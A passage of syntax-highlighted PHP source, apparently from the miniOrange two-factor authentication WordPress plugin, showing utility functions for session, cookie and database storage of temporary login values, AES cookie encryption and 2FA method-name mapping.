class="variable">$key</span>, <span class="variable">$value</span>, <span class="variable">$expiration</span>);</span><br><span class="line">                <span class="variable">$transient_array</span> = get_site_option(<span class="variable">$session_id</span>);</span><br><span class="line">                <span class="variable">$transient_array</span>[<span class="variable">$key</span>] = <span class="variable">$value</span>;</span><br><span class="line">                update_site_option(<span class="variable">$session_id</span>, <span class="variable">$transient_array</span>);</span><br><span class="line">                MO2f_Utility::mo2f_set_session_value(<span class="variable">$session_id</span>, <span class="variable">$transient_array</span>);</span><br><span class="line">                <span class="keyword">if</span>(is_array(<span class="variable">$value</span>))</span><br><span class="line">                <span class="variable">$value</span> = json_encode(<span class="variable">$value</span>) ;</span><br><span class="line">            </span><br><span class="line">                MO2f_Utility::mo2f_set_cookie_values(base64_encode(<span class="variable">$session_id</span>),<span class="variable">$value</span>);</span><br><span class="line">            </span><br><span class="line">  &#125;</span><br><span class="line">        public static <span class="keyword">function</span> mo2f_get_transient( <span class="variable">$session_id</span>, <span class="variable">$key</span>) &#123;</span><br><span class="line">                   MO2f_Utility::mo2f_start_session();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(isset(<span class="variable">$_SESSION</span>[<span class="variable">$session_id</span>]))&#123;</span><br><span class="line">                <span class="variable">$transient_array</span> = <span class="variable">$_SESSION</span>[<span class="variable">$session_id</span>];</span><br><span class="line">                <span class="variable">$transient_value</span> = isset(<span class="variable">$transient_array</span>[<span class="variable">$key</span>]) ? <span class="variable">$transient_array</span>[<span class="variable">$key</span>] : null;</span><br><span class="line">                <span class="built_in">return</span> <span class="variable">$transient_value</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span> <span class="keyword">if</span>(isset(<span class="variable">$_COOKIE</span>[base64_decode(<span class="variable">$session_id</span>)]))&#123;</span><br><span class="line">                <span class="variable">$transient_value</span> = MO2f_Utility::mo2f_get_cookie_values(base64_decode(<span class="variable">$session_id</span>));</span><br><span class="line">                <span class="built_in">return</span> <span class="variable">$transient_value</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="variable">$transient_value</span> = get_transient(<span class="variable">$session_id</span>.<span class="variable">$key</span>);</span><br><span class="line">                <span class="keyword">if</span>(!<span class="variable">$transient_value</span>)&#123;</span><br><span class="line">                                <span class="variable">$transient_array</span> = get_site_option(<span class="variable">$session_id</span>);</span><br><span class="line">                                <span class="variable">$transient_value</span> = isset(<span class="variable">$transient_array</span>[<span class="variable">$key</span>]) ? <span class="variable">$transient_array</span>[<span class="variable">$key</span>] : null;</span><br><span class="line">                        &#125;</span><br><span class="line">                <span class="built_in">return</span> <span class="variable">$transient_value</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">    public static <span class="keyword">function</span> mo2f_set_session_value(<span class="variable">$session_id</span>, <span class="variable">$transient_array</span>)&#123;</span><br><span class="line">                 MO2f_Utility::mo2f_start_session();</span><br><span class="line">                    <span class="variable">$_SESSION</span>[ <span class="variable">$session_id</span> ] = <span class="variable">$transient_array</span> ;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public static <span class="keyword">function</span> <span class="function"><span class="title">mo2f_start_session</span></span>() &#123;</span><br><span class="line">                <span class="keyword">if</span> ( ! session_id() || session_id() == <span class="string">&#x27;&#x27;</span> || ! isset( <span class="variable">$_SESSION</span> ) ) &#123;</span><br><span class="line">                        <span class="variable">$session_path</span> = ini_get(<span class="string">&#x27;session.save_path&#x27;</span>);</span><br><span class="line">                        <span class="keyword">if</span>( is_writable(<span class="variable">$session_path</span>) &amp;&amp; is_readable(<span class="variable">$session_path</span>) &amp;&amp; !headers_sent() ) &#123;</span><br><span class="line">                           <span class="keyword">if</span>(session_status() != PHP_SESSION_DISABLED )</span><br><span class="line">                                   session_start();</span><br><span class="line">                        &#125;</span><br><span class="line">                &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        /**</span><br><span class="line">         * The <span class="keyword">function</span> returns the session variables, and <span class="keyword">if</span> not, retrieves the cookie values <span class="built_in">set</span> <span class="keyword">in</span> <span class="keyword">case</span> the right permissions are not aassigned <span class="keyword">for</span> the sessions folder <span class="keyword">in</span> the server.</span><br><span class="line">         *</span><br><span class="line">         * @param string <span class="variable">$variable</span> - the session or cookie variable name</span><br><span class="line">         * @param string <span class="variable">$session_id</span> - the session <span class="built_in">id</span> of the user</span><br><span class="line">         *</span><br><span class="line">         * @<span class="built_in">return</span> string</span><br><span class="line">         */</span><br><span class="line">        public static <span class="keyword">function</span> mo2f_retrieve_user_temp_values( <span class="variable">$variable</span>, <span class="variable">$session_id</span> = null ) &#123;</span><br><span class="line">                global <span class="variable">$Mo2fdbQueries</span>;</span><br><span class="line">                <span class="variable">$data_option</span>=NULL;</span><br><span class="line">                <span class="keyword">if</span>(empty(<span class="variable">$data_option</span>))&#123;</span><br><span class="line">                        <span class="keyword">if</span> ( isset( <span class="variable">$_SESSION</span>[ <span class="variable">$variable</span> ] ) &amp;&amp; ! empty( <span class="variable">$_SESSION</span>[ <span class="variable">$variable</span> ] ) ) &#123;</span><br><span class="line">                                //update_option(<span class="string">&#x27;mo2f_data_storage&#x27;</span>,<span class="string">&quot;sessions&quot;</span>);</span><br><span class="line">                                <span class="built_in">return</span> <span class="variable">$_SESSION</span>[ <span class="variable">$variable</span> ];</span><br><span class="line">                        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                                <span class="variable">$key</span>        = get_option( <span class="string">&#x27;mo2f_encryption_key&#x27;</span> );</span><br><span class="line">                                <span class="variable">$cookie_value</span> = <span class="literal">false</span>;</span><br><span class="line">                                <span class="keyword">if</span> ( <span class="variable">$variable</span> == <span class="string">&#x27;mo2f_rba_status&#x27;</span> ) &#123;</span><br><span class="line">                                        <span class="keyword">if</span> ( isset( <span class="variable">$_COOKIE</span>[<span class="string">&#x27;mo2f_rba_status_status&#x27;</span>] ) &amp;&amp; ! empty( <span class="variable">$_COOKIE</span>[<span class="string">&#x27;mo2f_rba_status_status&#x27;</span>] ) ) &#123;</span><br><span class="line">                                                <span class="variable">$mo2f_rba_status_status</span>        = MO2f_Utility::mo2f_get_cookie_values( <span class="string">&#x27;mo2f_rba_status_status&#x27;</span> );</span><br><span class="line">                                                <span class="variable">$mo2f_rba_status_sessionUuid</span>   = MO2f_Utility::mo2f_get_cookie_values( <span class="string">&#x27;mo2f_rba_status_sessionUuid&#x27;</span> );</span><br><span class="line">                                                <span class="variable">$mo2f_rba_status_decision_flag</span> = MO2f_Utility::mo2f_get_cookie_values( <span class="string">&#x27;mo2f_rba_status_decision_flag&#x27;</span> );</span><br><span class="line">                                                <span class="variable">$cookie_value</span> = array(</span><br><span class="line">                                                        <span class="string">&quot;status&quot;</span>        =&gt; <span class="variable">$mo2f_rba_status_status</span>,</span><br><span class="line">                                                        <span class="string">&quot;sessionUuid&quot;</span>   =&gt; <span class="variable">$mo2f_rba_status_sessionUuid</span>,</span><br><span class="line">                                                        <span class="string">&quot;decision_flag&quot;</span> =&gt; <span class="variable">$mo2f_rba_status_decision_flag</span></span><br><span class="line">                                                );</span><br><span class="line">                                        &#125;</span><br><span class="line">                                &#125; <span class="keyword">else</span> <span class="keyword">if</span> ( <span class="variable">$variable</span> == <span class="string">&#x27;mo_2_factor_kba_questions&#x27;</span> ) &#123;</span><br><span class="line">                                        <span class="keyword">if</span> ( isset( <span class="variable">$_COOKIE</span>[<span class="string">&#x27;kba_question1&#x27;</span>] ) &amp;&amp; ! empty( <span class="variable">$_COOKIE</span>[<span class="string">&#x27;kba_question1&#x27;</span>] ) ) &#123;</span><br><span class="line"></span><br><span class="line">                                                <span class="variable">$kba_question1</span>[<span class="string">&#x27;question&#x27;</span>] = MO2f_Utility::mo2f_get_cookie_values( <span class="string">&#x27;kba_question1&#x27;</span> );</span><br><span class="line">                                                <span class="variable">$kba_question2</span>[<span class="string">&#x27;question&#x27;</span>] = MO2f_Utility::mo2f_get_cookie_values( <span class="string">&#x27;kba_question2&#x27;</span> );</span><br><span class="line">                                                <span class="variable">$cookie_value</span> = array( <span class="variable">$kba_question1</span>, <span class="variable">$kba_question2</span> );</span><br><span class="line">                                        &#125;</span><br><span class="line">                                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                                        <span class="variable">$cookie_value</span> = MO2f_Utility::mo2f_get_cookie_values( <span class="variable">$variable</span> );</span><br><span class="line">                                &#125;</span><br><span class="line">                                <span class="keyword">if</span>(<span class="variable">$cookie_value</span>)&#123;</span><br><span class="line">                                        <span class="built_in">return</span> <span class="variable">$cookie_value</span>;</span><br><span class="line">                                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                                        <span class="variable">$session_id</span> = MO2f_Utility::decrypt_data( <span class="variable">$session_id</span>, <span class="variable">$key</span> );</span><br><span class="line">                                        <span class="variable">$db_value</span> = <span class="variable">$Mo2fdbQueries</span>-&gt;get_user_login_details( <span class="variable">$variable</span>, <span class="variable">$session_id</span> );</span><br><span class="line">                                        <span class="keyword">if</span> ( in_array( <span class="variable">$variable</span>, array( <span class="string">&quot;mo2f_rba_status&quot;</span>, <span class="string">&quot;mo_2_factor_kba_questions&quot;</span> ) ) ) &#123;</span><br><span class="line">                                                <span class="variable">$db_value</span> = unserialize( <span class="variable">$db_value</span> );</span><br><span class="line">                                        &#125;</span><br><span class="line">                                        <span class="built_in">return</span> <span class="variable">$db_value</span>;</span><br><span class="line">                                &#125;</span><br><span class="line">                        &#125;</span><br><span class="line">                &#125;<span class="keyword">else</span> <span class="keyword">if</span> (!empty(<span class="variable">$data_option</span>) &amp;&amp; <span class="variable">$data_option</span>==<span class="string">&quot;sessions&quot;</span>)&#123;</span><br><span class="line">                        <span class="keyword">if</span> ( isset( <span class="variable">$_SESSION</span>[ <span class="variable">$variable</span> ] ) &amp;&amp; ! empty( <span class="variable">$_SESSION</span>[ <span class="variable">$variable</span> ] ) ) &#123;</span><br><span class="line">                                <span class="built_in">return</span> <span class="variable">$_SESSION</span>[ <span class="variable">$variable</span> ];</span><br><span class="line">                        &#125;</span><br><span class="line">                &#125;<span class="keyword">else</span> <span class="keyword">if</span> (!empty(<span class="variable">$data_option</span>) &amp;&amp; <span class="variable">$data_option</span>==<span class="string">&quot;cookies&quot;</span>)&#123;</span><br><span class="line">                        <span class="variable">$key</span>        = get_option( <span class="string">&#x27;mo2f_encryption_key&#x27;</span> );</span><br><span class="line">                        <span class="variable">$cookie_value</span> = <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">                        <span class="keyword">if</span> ( <span class="variable">$variable</span> == <span class="string">&#x27;mo2f_rba_status&#x27;</span> ) &#123;</span><br><span class="line">                                <span class="keyword">if</span> ( isset( <span class="variable">$_COOKIE</span>[<span class="string">&#x27;mo2f_rba_status_status&#x27;</span>] ) &amp;&amp; ! empty( <span class="variable">$_COOKIE</span>[<span class="string">&#x27;mo2f_rba_status_status&#x27;</span>] ) ) &#123;</span><br><span class="line">                                        <span class="variable">$mo2f_rba_status_status</span>        = MO2f_Utility::mo2f_get_cookie_values( <span class="string">&#x27;mo2f_rba_status_status&#x27;</span> );</span><br><span class="line">                                        <span class="variable">$mo2f_rba_status_sessionUuid</span>   = MO2f_Utility::mo2f_get_cookie_values( <span class="string">&#x27;mo2f_rba_status_sessionUuid&#x27;</span> );</span><br><span class="line">                                        <span class="variable">$mo2f_rba_status_decision_flag</span> = MO2f_Utility::mo2f_get_cookie_values( <span class="string">&#x27;mo2f_rba_status_decision_flag&#x27;</span> );</span><br><span class="line"></span><br><span class="line">                                        <span class="variable">$cookie_value</span> = array(</span><br><span class="line">                                                <span class="string">&quot;status&quot;</span>        =&gt; <span class="variable">$mo2f_rba_status_status</span>,</span><br><span class="line">                                                <span class="string">&quot;sessionUuid&quot;</span>   =&gt; <span class="variable">$mo2f_rba_status_sessionUuid</span>,</span><br><span class="line">                                                <span class="string">&quot;decision_flag&quot;</span> =&gt; <span class="variable">$mo2f_rba_status_decision_flag</span></span><br><span class="line">                                        );</span><br><span class="line">                                &#125;</span><br><span class="line"></span><br><span class="line">                        &#125; <span class="keyword">else</span> <span class="keyword">if</span> ( <span class="variable">$variable</span> == <span class="string">&#x27;mo_2_factor_kba_questions&#x27;</span> ) &#123;</span><br><span class="line"></span><br><span class="line">                                <span class="keyword">if</span> ( isset( <span class="variable">$_COOKIE</span>[<span class="string">&#x27;kba_question1&#x27;</span>] ) &amp;&amp; ! empty( <span class="variable">$_COOKIE</span>[<span class="string">&#x27;kba_question1&#x27;</span>] ) ) &#123;</span><br><span class="line">                                        <span class="variable">$kba_question1</span> = MO2f_Utility::mo2f_get_cookie_values( <span class="string">&#x27;kba_question1&#x27;</span> );</span><br><span class="line">                                        <span class="variable">$kba_question2</span> = MO2f_Utility::mo2f_get_cookie_values( <span class="string">&#x27;kba_question2&#x27;</span> );</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">                                        <span class="variable">$cookie_value</span> = array( <span class="variable">$kba_question1</span>, <span class="variable">$kba_question2</span> );</span><br><span class="line">                                &#125;</span><br><span class="line"></span><br><span class="line">                        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                                <span class="variable">$cookie_value</span> = MO2f_Utility::mo2f_get_cookie_values( <span class="variable">$variable</span> );</span><br><span class="line">                        &#125;</span><br><span class="line"></span><br><span class="line">                        <span class="keyword">if</span>(<span class="variable">$cookie_value</span>)&#123;</span><br><span class="line">                                <span class="built_in">return</span> <span class="variable">$cookie_value</span>;</span><br><span class="line">                        &#125;</span><br><span class="line">                &#125;<span class="keyword">else</span> <span class="keyword">if</span> (!empty(<span class="variable">$data_option</span>) &amp;&amp; <span class="variable">$data_option</span>==<span class="string">&quot;tables&quot;</span>)&#123;</span><br><span class="line">                        <span class="variable">$key</span> = get_option( <span class="string">&#x27;mo2f_encryption_key&#x27;</span> );</span><br><span class="line">                        <span class="variable">$session_id</span> = MO2f_Utility::decrypt_data( <span class="variable">$session_id</span>, <span class="variable">$key</span> );</span><br><span class="line">                        <span class="variable">$db_value</span> = <span class="variable">$Mo2fdbQueries</span>-&gt;get_user_login_details( <span class="variable">$variable</span>, <span class="variable">$session_id</span> );</span><br><span class="line">                        <span class="keyword">if</span> ( in_array( <span class="variable">$variable</span>, array( <span class="string">&quot;mo2f_rba_status&quot;</span>, <span class="string">&quot;mo_2_factor_kba_questions&quot;</span> ) ) ) &#123;</span><br><span class="line">                                <span class="variable">$db_value</span> = unserialize( <span class="variable">$db_value</span> );</span><br><span class="line">                        &#125;</span><br><span class="line">                        <span class="built_in">return</span> <span class="variable">$db_value</span>;</span><br><span class="line">                &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        /**</span><br><span class="line">         * The <span class="keyword">function</span> gets the cookie value after decoding and decryption.</span><br><span class="line">         *</span><br><span class="line">         * @param string <span class="variable">$cookiename</span> - the cookie name</span><br><span class="line">         *</span><br><span class="line">         * @<span class="built_in">return</span> string</span><br><span class="line">         */</span><br><span class="line">        public static <span class="keyword">function</span> mo2f_get_cookie_values( <span class="variable">$cookiename</span> ) &#123;</span><br><span class="line"></span><br><span class="line">                <span class="variable">$key</span>        = get_option( <span class="string">&#x27;mo2f_encryption_key&#x27;</span> );</span><br><span class="line">                <span class="keyword">if</span> ( isset( <span class="variable">$_COOKIE</span>[ <span class="variable">$cookiename</span> ] ) ) &#123;</span><br><span class="line">                        <span class="variable">$decrypted_data</span> = MO2f_Utility::decrypt_data( base64_decode( <span class="variable">$_COOKIE</span>[ <span class="variable">$cookiename</span> ] ), <span class="variable">$key</span> );</span><br><span class="line"></span><br><span class="line">                        <span class="keyword">if</span>(MO2f_Utility::isJSON(<span class="variable">$decrypted_data</span>))</span><br><span class="line">                         <span class="variable">$decrypted_data</span> = json_decode(<span class="variable">$decrypted_data</span>);</span><br><span class="line"></span><br><span class="line">                        <span class="keyword">if</span> ( <span class="variable">$decrypted_data</span> ) &#123;</span><br><span class="line">                                <span class="variable">$decrypted_data_array</span> = explode( <span class="string">&#x27;&amp;&#x27;</span>, <span class="variable">$decrypted_data</span> );</span><br><span class="line"></span><br><span class="line">                                <span class="variable">$cookie_value</span>         = <span class="variable">$decrypted_data_array</span>[0];</span><br><span class="line">                                <span class="keyword">if</span>(sizeof(<span class="variable">$decrypted_data_array</span>) == 2 )&#123;</span><br><span class="line">                                        <span class="variable">$cookie_creation_time</span> = new DateTime( <span class="variable">$decrypted_data_array</span>[1] );</span><br><span class="line">                                &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                                        <span class="variable">$cookie_creation_time</span> = new DateTime( array_pop(<span class="variable">$decrypted_data_array</span>) );</span><br><span class="line">                                        <span class="variable">$cookie_value</span> = implode(<span class="string">&#x27;&amp;&#x27;</span>, <span class="variable">$decrypted_data_array</span>);</span><br><span class="line">                                &#125;</span><br><span class="line">                                <span class="variable">$current_time</span>         = new DateTime( <span class="string">&#x27;now&#x27;</span> );</span><br><span class="line"></span><br><span class="line">                                <span class="variable">$interval</span> = <span class="variable">$cookie_creation_time</span>-&gt;diff( <span class="variable">$current_time</span> );</span><br><span class="line">                                <span class="variable">$minutes</span>  = <span class="variable">$interval</span>-&gt;format( <span class="string">&#x27;%i&#x27;</span> );</span><br><span class="line"></span><br><span class="line">                                <span class="variable">$is_cookie_valid</span> = <span class="variable">$minutes</span> &lt;= 5 ? <span class="literal">true</span> : <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">                                <span class="built_in">return</span> <span class="variable">$is_cookie_valid</span> ? <span class="variable">$cookie_value</span> : <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">                        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                                <span class="built_in">return</span> <span class="literal">false</span>;</span><br><span class="line">                        &#125;</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                        <span class="built_in">return</span> <span class="literal">false</span>;</span><br><span class="line">                &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    </span><br><span class="line">   public static <span class="keyword">function</span> isJSON(<span class="variable">$string</span>)&#123;</span><br><span class="line">           <span class="built_in">return</span> is_string(<span class="variable">$string</span>) &amp;&amp; is_array(json_decode(<span class="variable">$string</span>, <span class="literal">true</span>)) ? <span class="literal">true</span> : <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        /**</span><br><span class="line">         * The <span class="keyword">function</span> sets the cookie value after encryption and encoding.</span><br><span class="line">         *</span><br><span class="line">         * @param string <span class="variable">$cookiename</span> - the cookie name</span><br><span class="line">         * @param string <span class="variable">$cookievalue</span> - the cookie value to be <span class="built_in">set</span></span><br><span class="line">         *</span><br><span class="line">         * @<span class="built_in">return</span> string</span><br><span class="line">         */</span><br><span class="line">        public static <span class="keyword">function</span>  mo2f_set_cookie_values( <span class="variable">$cookiename</span>, <span class="variable">$cookievalue</span> ) &#123;</span><br><span class="line"></span><br><span class="line">                <span class="variable">$key</span>        = get_option( <span class="string">&#x27;mo2f_encryption_key&#x27;</span> );</span><br><span class="line"></span><br><span class="line">                <span class="variable">$current_time</span> = new DateTime( <span class="string">&#x27;now&#x27;</span> );</span><br><span class="line">                <span class="variable">$current_time</span> = <span class="variable">$current_time</span>-&gt;format( <span class="string">&#x27;Y-m-d H:i:sP&#x27;</span> );</span><br><span class="line">                <span class="variable">$cookievalue</span>  = <span class="variable">$cookievalue</span> . <span class="string">&#x27;&amp;&#x27;</span> . <span class="variable">$current_time</span>;</span><br><span class="line"></span><br><span class="line">                <span class="variable">$cookievalue_encrypted</span> = MO2f_Utility::encrypt_data( <span class="variable">$cookievalue</span>, <span class="variable">$key</span> );</span><br><span class="line">                // setcookie( <span class="variable">$cookiename</span>, base64_encode( <span class="variable">$cookievalue_encrypted</span> ) );</span><br><span class="line">                // setcookie( <span class="variable">$cookiename</span>, base64_encode( <span class="variable">$cookievalue_encrypted</span> ),NULL,NULL,NULL,NULL, TRUE );</span><br><span class="line">                <span class="variable">$_COOKIE</span>[<span class="variable">$cookiename</span>] = base64_encode( <span class="variable">$cookievalue_encrypted</span> );</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        /**</span><br><span class="line">         * @param string <span class="variable">$data</span> - the key=value pairs separated with &amp;</span><br><span class="line">         *</span><br><span class="line">         * @<span class="built_in">return</span> string</span><br><span class="line">         */</span><br><span class="line">        public static <span class="keyword">function</span> encrypt_data( <span class="variable">$data</span>, <span class="variable">$key</span> ) &#123;</span><br><span class="line">                <span class="variable">$plaintext</span> = <span class="variable">$data</span>;</span><br><span class="line">                <span class="variable">$ivlen</span> = openssl_cipher_iv_length(<span class="variable">$cipher</span>=<span class="string">&quot;AES-128-CBC&quot;</span>);</span><br><span class="line">                <span class="variable">$iv</span> = openssl_random_pseudo_bytes(<span class="variable">$ivlen</span>);</span><br><span class="line">                <span class="variable">$ciphertext_raw</span> = openssl_encrypt(<span class="variable">$plaintext</span>, <span class="variable">$cipher</span>, <span class="variable">$key</span>, <span class="variable">$options</span>=OPENSSL_RAW_DATA, <span class="variable">$iv</span>);</span><br><span class="line">                <span class="variable">$hmac</span> = hash_hmac(<span class="string">&#x27;sha256&#x27;</span>, <span class="variable">$ciphertext_raw</span>, <span class="variable">$key</span>, <span class="variable">$as_binary</span>=<span class="literal">true</span>);</span><br><span class="line">                <span class="variable">$ciphertext</span> = base64_encode( <span class="variable">$iv</span>.<span class="variable">$hmac</span>.<span class="variable">$ciphertext_raw</span> );</span><br><span class="line">                <span class="built_in">return</span> <span class="variable">$ciphertext</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        /**</span><br><span class="line">         * The <span class="keyword">function</span> unsets the session variables passed.</span><br><span class="line">         *</span><br><span class="line">         * @param array <span class="variable">$variables</span> - the array of session variables to be <span class="built_in">unset</span></span><br><span class="line">         *</span><br><span class="line">         * @<span class="built_in">return</span> NA</span><br><span class="line">         */</span><br><span class="line">        public static <span class="keyword">function</span> unset_session_variables( <span class="variable">$variables</span> ) &#123;</span><br><span class="line">                <span class="keyword">if</span> ( gettype( <span class="variable">$variables</span> ) == <span class="string">&quot;array&quot;</span> ) &#123;</span><br><span class="line">                        foreach ( <span class="variable">$variables</span> as <span class="variable">$variable</span> ) &#123;</span><br><span class="line">                                <span class="keyword">if</span> ( isset( <span class="variable">$_SESSION</span>[ <span class="variable">$variable</span> ] ) ) &#123;</span><br><span class="line">                                        <span class="built_in">unset</span>( <span class="variable">$_SESSION</span>[ <span class="variable">$variable</span> ] );</span><br><span class="line">                                &#125;</span><br><span class="line">                        &#125;</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                        <span class="keyword">if</span> ( isset( <span class="variable">$_SESSION</span>[ <span class="variable">$variables</span> ] ) ) &#123;</span><br><span class="line">                                <span class="built_in">unset</span>( <span class="variable">$_SESSION</span>[ <span class="variable">$variables</span> ] );</span><br><span class="line">                        &#125;</span><br><span class="line">                &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        /**</span><br><span class="line">         * The <span class="keyword">function</span> unsets the cookie variables passed.</span><br><span class="line">         *</span><br><span class="line">         * @param array <span class="variable">$variables</span> - the array of cookie variables to be <span class="built_in">unset</span></span><br><span class="line">         *</span><br><span class="line">         * @<span class="built_in">return</span> NA</span><br><span class="line">         */</span><br><span class="line">        public static <span class="keyword">function</span> unset_cookie_variables( <span class="variable">$variables</span> ) &#123;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> ( gettype( <span class="variable">$variables</span> ) == <span class="string">&quot;array&quot;</span> ) &#123;</span><br><span class="line">                        foreach ( <span class="variable">$variables</span> as <span class="variable">$variable</span> ) &#123;</span><br><span class="line">                                <span class="keyword">if</span> ( isset( <span class="variable">$_COOKIE</span>[ <span class="variable">$variable</span> ] ) ) &#123;</span><br><span class="line">                                        setcookie( <span class="variable">$variable</span>, <span class="string">&#x27;&#x27;</span>, time() - 3600,NULL,NULL,NULL, TRUE );</span><br><span class="line">                                &#125;</span><br><span class="line">                        &#125;</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                        <span class="keyword">if</span> ( isset( <span class="variable">$_COOKIE</span>[ <span class="variable">$variables</span> ] ) ) &#123;</span><br><span class="line">                                setcookie( <span class="variable">$variables</span>, <span class="string">&#x27;&#x27;</span>, time() - 3600,NULL,NULL,NULL, TRUE );</span><br><span class="line">                        &#125;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        /**</span><br><span class="line">         * The <span class="keyword">function</span> unsets the temp table variables passed.</span><br><span class="line">         *</span><br><span class="line">         * @param array <span class="variable">$variables</span> - the array of temporary table variables to be <span class="built_in">unset</span></span><br><span class="line">         * @param string <span class="variable">$session_id</span> - the session_id <span class="keyword">for</span> <span class="built_in">which</span> it should be destroyed</span><br><span class="line">         *</span><br><span class="line">         * @<span class="built_in">return</span> NA</span><br><span class="line">         */</span><br><span class="line">        public static <span class="keyword">function</span> unset_temp_user_details_in_table( <span class="variable">$variables</span>, <span class="variable">$session_id</span>, <span class="variable">$command</span>=<span class="string">&#x27;&#x27;</span> ) &#123;</span><br><span class="line">                global <span class="variable">$Mo2fdbQueries</span>;</span><br><span class="line">                <span class="variable">$key</span>        = get_option( <span class="string">&#x27;mo2f_encryption_key&#x27;</span> );</span><br><span class="line">                <span class="variable">$session_id</span> = MO2f_Utility::decrypt_data( <span class="variable">$session_id</span>, <span class="variable">$key</span> );</span><br><span class="line">                <span class="keyword">if</span>(<span class="variable">$command</span> == <span class="string">&quot;destroy&quot;</span>)&#123;</span><br><span class="line">                        <span class="variable">$Mo2fdbQueries</span>-&gt;delete_user_login_sessions( <span class="variable">$session_id</span> );</span><br><span class="line">                &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                        <span class="variable">$Mo2fdbQueries</span>-&gt;save_user_login_details( <span class="variable">$session_id</span>, array(<span class="variable">$variables</span> =&gt; <span class="string">&#x27;&#x27;</span>));</span><br><span class="line">                &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        /**</span><br><span class="line">         * The <span class="keyword">function</span> decodes the twofactor methods</span><br><span class="line">         *</span><br><span class="line">         * @param array <span class="variable">$variables</span> - the selected 2-<span class="built_in">factor</span> method and the decode <span class="built_in">type</span>.</span><br><span class="line">         *</span><br><span class="line">         * @<span class="built_in">return</span> NA</span><br><span class="line">         */</span><br><span class="line">        public static <span class="keyword">function</span> mo2f_decode_2_factor( <span class="variable">$selected_2_factor_method</span>, <span class="variable">$decode_type</span> ) &#123;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> ( <span class="variable">$selected_2_factor_method</span> == <span class="string">&#x27;NONE&#x27;</span> ) &#123;</span><br><span class="line">                        <span class="built_in">return</span> <span class="variable">$selected_2_factor_method</span>;</span><br><span class="line">                &#125;<span class="keyword">else</span> <span class="keyword">if</span>(<span class="variable">$selected_2_factor_method</span> == <span class="string">&quot;OTP Over Email&quot;</span>)</span><br><span class="line">                &#123;</span><br><span class="line">                        <span class="variable">$selected_2_factor_method</span> = <span class="string">&quot;OTPOverEmail&quot;</span>;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">                <span class="variable">$wpdb_2fa_methods</span> = array(</span><br><span class="line">                        <span class="string">&quot;miniOrangeQRCodeAuthentication&quot;</span> =&gt; <span class="string">&quot;miniOrange QR Code Authentication&quot;</span>,</span><br><span class="line">                        <span class="string">&quot;miniOrangeSoftToken&quot;</span>            =&gt; <span class="string">&quot;miniOrange Soft Token&quot;</span>,</span><br><span class="line">                        <span class="string">&quot;miniOrangePushNotification&quot;</span>     =&gt; <span class="string">&quot;miniOrange Push Notification&quot;</span>,</span><br><span class="line">                        <span class="string">&quot;GoogleAuthenticator&quot;</span>            =&gt; <span class="string">&quot;Google Authenticator&quot;</span>,</span><br><span class="line">                        <span class="string">&quot;AuthyAuthenticator&quot;</span>             =&gt; <span class="string">&quot;Authy Authenticator&quot;</span>,</span><br><span class="line">                        <span class="string">&quot;SecurityQuestions&quot;</span>              =&gt; <span class="string">&quot;Security Questions&quot;</span>,</span><br><span class="line">                        <span class="string">&quot;EmailVerification&quot;</span>              =&gt; <span class="string">&quot;Email Verification&quot;</span>,</span><br><span class="line">                        <span class="string">&quot;OTPOverSMS&quot;</span>                     =&gt; <span class="string">&quot;OTP Over SMS&quot;</span>,</span><br><span class="line">                        <span class="string">&quot;OTPOverEmail&quot;</span>                                   =&gt; <span class="string">&quot;OTP Over Email&quot;</span>,</span><br><span class="line">                        <span class="string">&quot;DuoAuthenticator&quot;</span>               =&gt; <span class="string">&quot;Duo Authenticator&quot;</span></span><br><span class="line">                );</span><br><span class="line"></span><br><span class="line">                <span class="variable">$server_2fa_methods</span> = array(</span><br><span class="line">                        <span class="string">&quot;miniOrange QR Code Authentication&quot;</span> =&gt; <span class="string">&quot;MOBILE AUTHENTICATION&quot;</span>,</span><br><span class="line">                        <span class="string">&quot;miniOrange Soft Token&quot;</span>             =&gt; <span class="string">&quot;SOFT TOKEN&quot;</span>,</span><br><span class="line">                        <span class="string">&quot;miniOrange Push Notification&quot;</span>      =&gt; <span class="string">&quot;PUSH NOTIFICATIONS&quot;</span>,</span><br><span class="line">                        <span class="string">&quot;Google Authenticator&quot;</span>              =&gt; <span class="string">&quot;GOOGLE AUTHENTICATOR&quot;</span>,</span><br><span class="line">                        <span class="string">&quot;Authy Authenticator&quot;</span>               =&gt; <span class="string">&quot;GOOGLE AUTHENTICATOR&quot;</span>,</span><br><span class="line">                        <span class="string">&quot;Security Questions&quot;</span>                =&gt; <span 